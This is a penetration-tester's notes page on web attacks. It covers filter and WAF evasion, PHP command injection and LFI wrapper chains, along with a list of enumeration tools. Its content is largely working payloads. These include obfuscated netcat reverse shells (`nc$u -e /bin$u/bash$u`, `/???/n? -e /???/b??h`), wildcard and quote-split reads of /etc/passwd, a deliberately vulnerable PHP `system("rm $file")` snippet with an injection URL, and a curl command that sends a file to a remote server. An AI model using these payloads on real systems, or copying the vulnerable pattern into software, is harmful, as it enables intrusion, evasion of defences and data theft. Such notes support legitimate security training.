---
description: >-
  TODO: Need to pull web notes out of the OS Agnostic section (and then rename
  that to something better!)
---

# Web Notes

## Payloads and Bypass Methods for Web Filtering

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" caption="swisskyrepo / PayloadsAllTheThings" %}

{% embed url="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/" caption="How To Exploit PHP Remotely To Bypass Filters & WAF Rules" %}

### Use Uninitialized Shell Variables to Bypass Filters

{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" caption="Web Application Firewall \(WAF\) Evasion Techniques \#3" %}

Uninitialized shell variables can be used for bypassing web application firewalls \(WAF\).  Example: bypassing a filter to execute a reverse shell - `nc$u -e /bin$u/bash$u <ip> <port>`.  If this doesn't work try adding spaces before and after the variable \(note the `+`'s, this example is also URL encoded\): `nc+$u++-e+/bin$u/bash$u <ip> <port>` _\(`$u` in this case is a random attacker-picked variable that would hopefully be uninitialized on the target\)._

### Use Wildcards to Bypass Filters

{% embed url="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" caption="Web Application Firewall \(WAF\) Evasion Techniques" %}

Bypass web filters by using bash wildcards:`/???/?s` `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` will bypass...and execute every command that matches. such as `/bin/cat /etc/apt`, and `/bin/cat /etc/passwd`

netcat firewall bypass: `/???/n? -e /???/b??h 2130706433 1337` \(`/???/?c.??????????? -e /???/b??h 2130706433 1337` for nc traditional\)

```text
Standard: /bin/nc 127.0.0.1 1337
Evasion:/???/n? 2130706433 1337
Used chars: / ? n [0-9]

Standard: /bin/cat /etc/passwd
Evasion: /???/??t /???/??ss??
Used chars: / ? t s
```

### Use String Concatenation to Bypass Filters

```text
$ /bin/cat /etc/passwd
$ /bin/cat /e'tc'/pa'ss'wd
$ /bin/c'at' /e'tc'/pa'ss'wd
$ /b'i'n/c'a't /e't'c/p'a's's'w'd'
Can use \\ instead of ' as well
```

### Convert IP Address to Decimal Format 

It is still understood by most programs and languages, and avoids `.` character in filtered HTTP requests: `127.0.0.1 = 2130706433`

### LFI / RFI by Bypassing Filters Using Wrappers

From [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#lfi--rfi-using-wrappers)   `php://filter/` has multiple ways to bypass PHP input filters ;These can be chained with `|` or `/` : zip, data, expect, input, phar; many more different wrappers to try!

```php
/zlib.deflate/read=string.rot13/convert.base64-encode/convert.iconv.utf-8.utf-16/resource=<resource to get>
```

## Command Injection

{% embed url="https://owasp.org/www-community/attacks/Command\_Injection" %}

### PHP Command Injection

The following PHP code snippet is vulnerable to a command injection attack:

```php
<?php
print("Please specify the name of the file to delete");
print("<p>");
$file=$_GET['filename'];
system("rm $file");
?>
```

The following request is an example of that will successful attack on the previous PHP code, and will output the results of the `id` command: `http://127.0.0.1/delete.php?filename=bob.txt;id`.  Look for exposed `$_GET['filename']` type variables that take input from the user, or can be injected into from the URL.  This combined with `system("<command>")` will allow for command injection.

Local File Inclusion \(LFI\) / Remote File Inclusion \(RFI\)

Common and/or useful files to check for when exploiting Local File Inclusion \(for both Linux and Windows\): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)

## To sort

Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`

in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

vulnerability testing for webdav \(or other file upload vulns!\): `davtest`

bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`

pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`

virtual host routing: substitute ip for hostname to get different results

gobuster:

```bash
gobuster -u <url> -l -w <wordlist> -x php -t 20
[-l include length, -x append .php to searches, -t threads]
```

hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)

